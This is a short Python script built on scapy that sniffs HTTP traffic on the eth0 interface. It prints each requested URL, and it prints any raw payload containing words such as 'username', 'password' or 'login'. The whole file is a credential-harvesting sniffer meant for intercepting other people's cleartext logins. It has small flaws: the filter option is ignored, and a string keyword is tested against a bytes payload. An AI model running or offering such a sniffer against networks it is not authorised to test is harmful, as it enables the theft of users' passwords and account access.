import scapy.all as scapy
import optparse
from scapy.layers import http

def getArgs():
    parser = optparse.OptionParser()
    parser.add_option("-f", "--filter", dest="filter", help="Protocol Filter")
    (options, arguments) = parser.parse_args()
    return options

def sniff(interface, Filter) :
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packets) :
    if packets.haslayer(http.HTTPRequest) :
        url = packets[http.HTTPRequest].host + packets[http.HTTPRequest].path
        print(f"{url}\n")

        if packets.haslayer(scapy.Raw) :
            keywords = ["username", "password", "login", "pass", "user"]
             
            for x in keywords:
                if x in packets[scapy.Raw].load :
                    print(packets[scapy.Raw].load)
                    break

options = getArgs()
sniff("eth0", options.filter)
